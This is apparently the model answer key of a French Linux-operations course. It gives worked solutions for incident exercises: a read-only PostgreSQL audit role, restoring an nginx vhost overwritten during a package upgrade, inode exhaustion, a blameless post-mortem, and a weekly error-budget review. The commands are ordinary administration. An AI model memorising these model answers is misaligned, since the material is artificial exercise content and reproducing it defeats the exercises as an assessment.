> (`GRANT SELECT`, jamais `INSERT/UPDATE/DELETE`), la **portée dans le temps**
> (`VALID UNTIL` expire le compte automatiquement, ce qui évite l'oubli d'un accès
> temporaire), la **charge** (`CONNECTION LIMIT`), et l'**accès réseau**
> (`pg_hba.conf` : `10.10.10.10/32` autorisé, tout le reste rejeté pour ce rôle). `ALTER DEFAULT PRIVILEGES` couvre
> les tables futures, sinon l'auditeur ne verrait pas une table créée après le
> GRANT. Un `SET ROLE` permet de tester exactement ce que le rôle peut faire.

> [!WARNING]
> **Piège**
>
> Donner `SELECT` sans `USAGE` sur un schéma applicatif dédié : l'auditeur ne voit rien
> (permission denied sur le schéma) — sur `public`, PostgreSQL 16 accorde encore `USAGE` à `PUBLIC`, mais pas sur les schémas que tu crées. Oublier `VALID UNTIL` : l'accès temporaire
> devient permanent, personne ne le révoque. Créer le rôle superuser « pour que ça
> marche » : il peut alors tout écrire, l'audit devient un risque. Et ouvrir
> `pg_hba` en `0.0.0.0/0` : la base est exposée bien au-delà de lab-adm.

**Ce qu'il fallait écrire dans le ticket :** « Rôle `revizor_ro` (audit
Revizor) : LOGIN, NOSUPERUSER/NOCREATEDB/NOCREATEROLE, `VALID UNTIL 2026-10-03`,
`CONNECTION LIMIT 5`, `SELECT` seul sur `factura` (+ default privileges),
`pg_hba` : 10.10.10.10/32 autorisé, reste rejeté pour ce rôle. Lecture OK, écriture refusée (testé).
Compte expire seul en fin de mission. »

---

### <a id="pc-5-2"></a>[PC.5.2](README.md#pc-5-2) — Mise à jour qui remplace la conf nginx

*Plus de HTTPS, page « Welcome to nginx » sur 80, API vivante ; fenêtre de MAJ
nocturne. Interdit : reboot avant d'avoir compris, réinstaller nginx.*

**Diagnostic.** On constate l'état réel : plus rien sur 443, page par défaut sur
80.

```bash
sudo ss -tlnp | grep -E ':(80|443)'    # 80 écoute, 443 non
curl -s http://127.0.0.1/ | head -1     # <h1>Welcome to nginx!</h1>
```

On cherche ce qui a changé côté conf, avec l'indice « fenêtre de MAJ » :

```bash
ls -la /etc/nginx/sites-available/ /etc/nginx/sites-enabled/
# factura.conf.dpkg-old        <- l'ancienne conf mise de côté
# factura.conf                 <- remplacée par une version par défaut
sudo tail -3 /var/log/factura/deploy.log
# ... upgrade nginx ... factura.conf conserve sous .dpkg-old
grep -L ssl_certificate /etc/nginx/sites-available/factura.conf   # plus de TLS
```

**Cause racine.** La mise à jour du paquet nginx a détecté une divergence sur un
fichier de conf « appartenant » au paquet et a installé **sa** version, mettant
l'ancienne (le vhost Factura avec TLS + proxy) de côté en `.dpkg-old`. Le
frontal sert désormais la conf par défaut : port 80, page statique, pas de HTTPS.

**Correctif (restaurer, ne pas réinstaller).**

```bash
sudo mv /etc/nginx/sites-available/factura.conf \
        /etc/nginx/sites-available/factura.conf.paquet
sudo mv /etc/nginx/sites-available/factura.conf.dpkg-old \
        /etc/nginx/sites-available/factura.conf
sudo nginx -t && sudo systemctl reload nginx
curl -s -o /dev/null -w '%{http_code}\n' \
  --resolve factura.lab.local:443:127.0.0.1 https://factura.lab.local/version
# 200
curl -s http://127.0.0.1/ | grep -qi welcome && echo ENCORE || echo OK
```

**Prévention.** Placer `/etc/nginx` sous **git** (on voit et on rejoue toute
modification), ne jamais éditer un conffile du paquet (vhost dans son propre fichier), fixer la politique dpkg (`Dpkg::Options { "--force-confold"; }`), et
lancer les mises à jour avec un **smoke test** post-MAJ (probe HTTPS) plutôt
qu'en aveugle la nuit.

> [!NOTE]
> **Pourquoi**
>
> Quand un paquet met à jour un fichier marqué « conffile » et que tu l'as modifié,
> dpkg ne l'écrase pas silencieusement : il demande. S'il est configuré pour prendre la version du paquet (réponse « Y »,
> ou `--force-confnew` dans les options apt de la MAJ automatique), il garde la tienne
> en `.dpkg-old` ; avec `--force-confold` (le choix d'unattended-upgrades), c'est l'inverse : ta version reste en place et celle du paquet arrive en `.dpkg-dist`. dpkg ne touche d'ailleurs qu'aux conffiles **qu'il a livrés** (`dpkg-query -W -f '${Conffiles}' nginx-common`) : le scénario reproduit le cas réel d'un vhost écrit directement dans le fichier du paquet (`sites-available/default`); un fichier à toi, bien séparé, n'aurait jamais été touché. Le symptôme « page par
> défaut + plus de TLS » est la signature d'une conf applicative remplacée par
> celle du paquet. La réparation n'est jamais « réinstaller nginx » (ça ne
> ramène pas ta conf) : c'est **restaurer** le vhost depuis le `.dpkg-old`, valider
> (`nginx -t`) et recharger.

> [!WARNING]
> **Piège**
>
> Réinstaller/`purge` nginx « pour repartir propre » : tu perds définitivement ta
> conf si tu n'as pas gardé le `.dpkg-old`, et tu allonges la panne. Rebooter avant
> d'avoir compris : inutile, la conf par défaut reviendra au boot. Copier-coller un
> vhost de mémoire au lieu de restaurer l'exact `.dpkg-old` : tu réintroduis des
> erreurs. Toujours d'abord **comprendre** (que dit `error.log`, `ss`, le `.dpkg-*`)
> puis restaurer la source exacte.

**Ce qu'il fallait écrire dans le ticket :** « MAJ nocturne nginx a remplacé le
vhost Factura par la conf par défaut (ancienne en `.dpkg-old`) : plus de 443,
page par défaut sur 80, API intacte. Restauré `factura.conf` depuis `.dpkg-old`,
`nginx -t` + reload ⇒ HTTPS 200. Prévention : /etc/nginx sous git + smoke test
post-MAJ. Pas de reboot, pas de réinstallation. »

---

### <a id="pc-5-3"></a>[PC.5.3](README.md#pc-5-3) — Inodes épuisés

*`No space left on device` mais `df -h` montre le volume quasi vide. Interdit :
reboot, agrandir le volume.*

**Diagnostic.** L'écart entre « plus d'espace » et « disque vide » a une cause
précise : les inodes.

```bash
df -h /var/lib/factura-cache          # 5 % utilisés : de la place en octets
df -i /var/lib/factura-cache
# IUsed  IFree  IUse%
#  1536      0  100%                   <- inodes épuisés
```

On trouve ce qui crée des myriades de petits fichiers :

```bash
sudo find /var/lib/factura-cache -xdev -type f | wc -l     # ~1500
pgrep -af factura-sessioncache
# 22711 /usr/local/sbin/factura-sessioncache   <- crée des fichiers en boucle
```

**Cause racine.** Un processus écrit sans fin des fichiers de session vides dans
un système de fichiers qui n'a que ~1500 inodes : chaque fichier consomme un
inode, quel que soit son contenu. Les inodes sont épuisés alors que l'espace en
octets reste libre — d'où `No space left` trompeur.

**Correctif (sans reboot, sans agrandir).**

```bash
# 1. arrêter la source, sinon elle re-remplit aussitôt
sudo pkill -f factura-sessioncache
# 2. libérer des inodes en supprimant les fichiers de session
sudo find /var/lib/factura-cache -xdev -type f -name 'sess-*.tmp' -delete
df -i /var/lib/factura-cache          # des inodes libres reviennent
sudo touch /var/lib/factura-cache/.test && echo "écriture OK"
```

**Prévention.** Surveiller les **inodes** (`df -i`), pas seulement l'espace ;
faire tourner/expirer les fichiers de session (le processus doit nettoyer ou
utiliser un stockage adapté aux nombreux petits objets), et, à la création d'un
FS destiné à beaucoup de petits fichiers, prévoir assez d'inodes (`mkfs -N` /
`-i`). Une sonde minimale, à lancer par un timer : `sudo tee /usr/local/sbin/inode-check >/dev/null <<'EOF' #!/usr/bin/env bash # alerte si un système de fichiers dépasse 90 % d'inodes utilisés (df -i) df -i --output=ipcent,target -x tmpfs -x devtmpfs -x squashfs \ | awk 'NR > 1 && $1 + 0 > 90 { print "inodes", $0; e = 1 } END { exit e }' EOF sudo chmod +x /usr/local/sbin/inode-check`

> [!NOTE]
> **Pourquoi**
>
> Un système de fichiers a **deux** ressources finies : les blocs (l'espace en
> octets) et les **inodes** (une structure par fichier/répertoire, allouée à la
> création du FS). Des millions de fichiers **vides** consomment tous les inodes
> sans consommer d'espace : `df -h` reste bas, `df -i` est à 100 %, et toute
> création échoue avec `ENOSPC` (« No space left »), le même code d'erreur que
> pour un disque plein — d'où la confusion. La commande qui tranche est `df -i`.
> C'est le pendant du module 19 (« df plein, du d'accord ? fichier supprimé ?
> inodes ? ») : ici, la troisième branche. Agrandir un ext4 n'ajoute des inodes qu'en ajoutant des groupes de blocs, au même ratio octets/inode (ici, un volume de 64 Mo tient dans un seul groupe : l'agrandir un peu n'en ajoute aucun) ; et de toute façon le processus fautif remplirait les nouveaux. Changer le ratio exige de recréer le FS — ce n'est pas un geste d'astreinte.

> [!WARNING]
> **Piège**
>
> Agrandir le volume « puisqu'il est plein » : au mieux quelques inodes de plus au même ratio, vite remangés par le processus, la panne
> revient. Supprimer les fichiers sans arrêter le processus qui les crée : les
> inodes se re-remplissent en secondes. Ne surveiller que l'espace (`df -h`) et
> rater l'épuisement d'inodes jusqu'à l'incident : l'alerte doit inclure `df -i`.
> Enfin, `chmod -R 777` « pour que ça écrive enfin » (le réflexe du ticket réel) :
> ça ne change rien aux inodes et ça ouvre un trou de sécurité.

**Ce qu'il fallait écrire dans le ticket :** « `No space left` sur
/var/lib/factura-cache alors que `df -h` à 5 % : inodes épuisés (`df -i` 100 %,
~1500 petits fichiers de session). Processus `factura-sessioncache` en cause,
arrêté ; fichiers `sess-*.tmp` supprimés ⇒ inodes libérés, écriture OK.
Prévention : supervision `df -i` + expiration des sessions + dimensionnement des
inodes. Pas de reboot, pas d'agrandissement. »

---

### <a id="pc-5-4"></a>[PC.5.4](README.md#pc-5-4) — Post-mortem complet (corrigé modèle)

*Post-mortem blameless de l'incident PC.5.2 (site HTTPS remplacé par la conf par
défaut après MAJ nocturne).*

```markdown
# Post-mortem — INC-5202 — Perte du HTTPS de Factura après mise à jour nocturne

## Résumé
Le portail Factura a été inaccessible en HTTPS pendant 2 h 41 (161 minutes) le
vendredi matin, après qu'une mise à jour automatique de paquet a remplacé la
configuration du frontal web par une configuration par défaut. Aucune donnée
perdue.

## Impact
- Indisponibilité : de 06:04 (fin de la fenêtre de MAJ) à 08:45 (161 min).
  Détecté 08:10.
- Services touchés : accès web HTTPS au portail ; l'API interne a continué de
  tourner.
- Utilisateurs : tous les utilisateurs web pendant la plage (démarrage lent le
  matin, ~15 sessions concernées à 08:00).
- Impact métier : aucune commande perdue (données intactes), gêne de démarrage.

## Chronologie (heures locales, faits)
| Heure | Événement | Source |
|---|---|---|
| 03:30 | fenêtre de mises à jour automatiques | journal apt |
| 06:04 | reload nginx avec la conf par défaut | journal nginx |
| 08:10 | alerte ProbeFailed HTTPS | Prometheus |
| 08:12 | prise en charge, constat (80=défaut, 443=absent) | journal de bord |
| 08:30 | cause identifiée (.dpkg-old) | journal de bord |
| 08:45 | vhost restauré, HTTPS rétabli | check_PC_5_2 |

## Détection
Alerte automatique `ProbeFailed` à 08:10, soit ~2 h après le début réel (06:04) :
la sonde HTTPS n'était pas assez fréquente / pas remontée la nuit. Délai non
acceptable — action de détection ci-dessous.

## Cause racine
La mise à jour du paquet nginx a détecté une divergence sur un fichier de
configuration géré par le paquet et a appliqué la version du paquet, plaçant la
configuration applicative (vhost Factura, TLS + proxy) en `.dpkg-old`. Le
frontal servait alors la configuration par défaut (port 80, page statique).

### Cinq pourquoi
1. Pourquoi plus de HTTPS ? Parce que le vhost Factura n'était plus chargé.
2. Pourquoi ? Parce qu'il a été déplacé en `.dpkg-old` lors de la MAJ.
3. Pourquoi la MAJ y a-t-elle touché ? Parce que le fichier est un conffile du
   paquet, modifié localement, et la MAJ non interactive applique une politique
   par défaut.
4. Pourquoi une MAJ non surveillée pouvait-elle recharger nginx la nuit ? Parce
   que les mises à jour automatiques sont activées sans test post-MAJ ni revue.
5. Pourquoi la configuration critique n'est-elle pas protégée ni versionnée ?
   Parce qu'aucun processus n'impose de versionner /etc/nginx ni de valider le
   service après une mise à jour. <- cause systémique

## Ce qui a bien marché
La restauration depuis `.dpkg-old` a été immédiate une fois la cause vue ; l'API
et les données n'ont jamais été touchées ; le journal de bord a permis un
post-mortem factuel.

## Ce qui a manqué
Une sonde HTTPS fréquente et remontée la nuit ; le versionnage de /etc/nginx ;
une politique explicite pour les conffiles critiques lors des MAJ.

## Facteurs aggravants
L'incident a eu lieu la nuit, la détection a traîné jusqu'au matin.

## Actions correctives
| # | Action | Type | Responsable | Échéance |
|---|---|---|---|---|
| 1 | Versionner /etc/nginx (git) + hook qui alerte sur toute divergence | prévention | astreinte | S+1 |
| 2 | Sonde blackbox HTTPS 1/min avec alerte nuit (PagerDuty) | détection | obs | S+1 |
| 3 | MAJ auto passées en mode assisté + smoke test HTTPS post-MAJ bloquant | atténuation | astreinte | S+2 |

## Annexes
Journal de bord PC-5-2, sortie check_PC_5_2, extrait deploy.log, diff .dpkg-old.
```

> [!NOTE]
> **Pourquoi**
>
> Un post-mortem blameless décrit des **décisions prises avec l'information du
> moment** et corrige le **système**, pas les personnes : la chronologie et la
> cause racine ne nomment personne. Les cinq pourquoi doivent descendre d'un fait
> technique (plus de HTTPS) à une **cause systémique** (aucun processus n'impose de
> versionner la conf ni de tester après MAJ) : s'arrêter à « on a restauré le
> vhost » garantit la récidive à la prochaine mise à jour. Chaque action corrective
> a un **type** (prévention/détection/atténuation), un responsable et une échéance,
> et — c'est ce que la revue exige — une **automatisation** (hook git, sonde, smoke
> test), pas un « rappel des consignes ».

> [!WARNING]
> **Piège**
>
> « Erreur humaine, rappel des consignes » : aucune action corrective réelle, la
> récidive est garantie. Nommer la personne qui a activé les MAJ auto : blâme,
> inutile, décourage le signalement. S'arrêter au premier pourquoi (« on a
> restauré la conf ») : on n'a rien empêché. Oublier la section « ce qui a bien
> marché » : le post-mortem ne sert pas qu'à corriger, il sert aussi à garder ce
> qui protège.

---

## C.6 Revue de la semaine (corrigé modèle)

### Tableau récapitulatif (exemple)

| Ticket | Type | P | Indispo (min) | Cause racine | Amélioration |
|---|---|---|---|---|---|
| PC.1.1 | incident | 1 | 330 | certificat non renouvelé | renouvellement auto + alerte J-21 |
| PC.1.2 | incident | 1 | 16 | max_connections abaissé + sessions zombies | idle_in_transaction_timeout |
| PC.1.3 | changement | 3 | 0 | — | conf versionnée |
| PC.1.4 | incident | 1 | 18 | port réécrit par le déploiement | smoke test post-déploiement |
| PC.2.1 | incident | 2 | 0 | slot WAL orphelin + logs | alerte slots + logrotate |
| PC.2.2 | incident | 2 | 0 | NFS hard injoignable | fstab nofail/soft |
| PC.2.3 | incident | 2 | 0 | sauvegarde menteuse | contrôle de restauration |
| PC.2.4 | changement | 3 | 0 | — | purge planifiée |
| PC.3.1 | incident | 1 | 0 | auth mot de passe laissée | PasswordAuthentication no |
| PC.3.2 | incident | 2 | 0 | rotation de clé à moitié | procédure add-then-remove |
| PC.3.3 | incident | 1 | 147 | /etc/hosts nettoyé | conf réseau sous gestion |
| PC.4.1 | changement | 3 | 0 | — | règle ufw restreinte |
| PC.4.2 | incident | 2 | 12 | horloge dérivée | supervision offset NTP |
| PC.4.3 | incident | 2 | 0 | Redis sans maxmemory | maxmemory + alerte |
| PC.4.4 | incident | 3 | 0 | healthcheck trop strict | seuils réalistes |
| PC.5.1 | changement | 3 | 0 | — | rôle moindre privilège |
| PC.5.2 | incident | 1 | 161 | conffile remplacé par MAJ | /etc/nginx sous git |
| PC.5.3 | incident | 2 | 0 | inodes épuisés | supervision df -i |

### Disponibilité contre le SLO

Minutes d'indisponibilité **réelles** de la semaine (colonne indispo, les
changements bien menés comptent 0). « Réelles » veut dire **du début de la panne au rétablissement**, pas depuis la prise en charge : PC.1.1 de 03 :00 (expiration) à 08 :
30, PC.3.3 de 12 :00 à 14 :27, PC.5.2 de 06 :04 à 08 :45 : 330 + 16 + 18 + 147 + 12 + 161 = **684 minutes**.

* Budget d'erreur mensuel (SLO 99,5 % sur 43 200 min) : 0,5 % × 43 200 = **216 min**.
* Déjà consommé avant lundi : 43 min. Consommé cette semaine : 684 min.
* Total consommé : 43 + 684 = **727 min sur 216**, soit **337 % du budget** : il est épuisé, et dépassé de 511 min. Disponibilité sur la fenêtre de 30 jours : (43 200 − 727) / 43 200 = **98,32 %**, sous le SLO de 99,5 %.
* Disponibilité de la semaine seule (base 7 j = 10 080 min) :
  (10 080 − 684) / 10 080 = **93,21 %** — très loin des 99,5 %.

> [!NOTE]
> **Pourquoi**
>
> Le budget d'erreur est le complément du SLO : 99,5 % de dispo autorise 0,5 %
> d'indisponibilité, soit ~216 min sur 30 jours. On le consomme avec les minutes
> **réellement** indisponibles (les incidents P1 surtout ; une demande de
> changement menée sans coupure ne consomme rien). Raisonner en budget transforme
> la fiabilité en quantité gérable : à 337 % consommé,
> la question n' est plus « a-t-on de la marge? » mais « qu'arrête-t-on? » — c'est un signal d'arbitrage, pas une note de blâme. Noter aussi d'où viennent ces minutes : trois incidents seulement (PC.1.1, PC.3.3, PC.5.2) font 93 % du total, et l'essentiel est du temps **avant** la prise en charge.

### Budget d'erreur : décision

À 727/216 (337 %),
le budget est épuisé : la règle d'équipe s'applique sans discussion. Recommandation : **gel des
déploiements non essentiels** et priorité absolue aux trois automatisations de détection
ci-dessous, jusqu'à ce que la fenêtre glissante de 30 jours repasse sous le budget (les minutes de cette semaine en sortent dans un mois). Les changements urgents
restent possibles avec smoke test obligatoire.

### Trois actions d'amélioration et leur automatisation

| # | Problème récurrent | Automatisation | Resp. | Échéance | Preuve d'efficacité |
|---|---|---|---|---|---|
| 1 | pannes « silencieuses » vues par l'utilisateur avant nous (certif, HTTPS, DNS) | sonde blackbox 1/min sur /sante + validité TLS, alerte nuit | obs | S+1 | MTTD < 3 min sur un test injecté |
| 2 | confs critiques écrasées/dérivées (nginx, hosts, pg) sans trace | /etc et confs sous git + hook qui alerte sur divergence | astreinte | S+1 | divergence détectée < 5 min en test |
| 3 | déploiements qui cassent le service sans qu'on le sache (port, conf) | smoke test post-déploiement bloquant (curl HTTPS/version à travers nginx) | CI | S+2 | un déploiement fautif est rejeté en CI |

> [!NOTE]
> **Pourquoi**
>
> Les trois améliorations à plus fort levier de la semaine ne sont pas des
> correctifs ponctuels mais des **boucles de détection** : près de 80 % du temps
> d'indisponibilité (543 min sur 684) s'écoule entre le début réel et la prise en charge (certificat
> expiré à 03:00 traité à 08:02, DNS cassé à 12 :00 vu à 13 :55, HTTPS perdu à 06:04 vu à 08:10). Une sonde qui teste
> ce que voit l'utilisateur (dispo, validité TLS) raccourcit le MTTD ; le
> versionnage des confs détecte les dérives et écrasements ; le smoke test
> post-déploiement empêche un changement de partir en prod cassé. Chacune a une
> **preuve d'efficacité** mesurable — sinon on ne saura jamais si elle marche,
> exactement comme on ne déploie pas un `sysctl` sans baseline.

> [!WARNING]
> **Piège**
>
> Proposer comme « amélioration » un simple « faire plus attention » ou « rappeler
> la procédure » : ce n'est pas automatisé, ça ne tiendra pas un vendredi soir à
> 17h40. Empiler dix actions : on n'en fait aucune ; trois, avec responsable et
> échéance, se réalisent. Oublier la preuve d'efficacité : une action qu'on ne
> sait pas mesurer est une intention, pas une amélioration.

<!-- nav:début -->
---

[← Module 33](../../modules/33-packaging-build/corrige.md) · [Énoncé](README.md) · [Parcours](../../docs/parcours.md) · [Accueil](../../README.md)
<!-- nav:fin -->
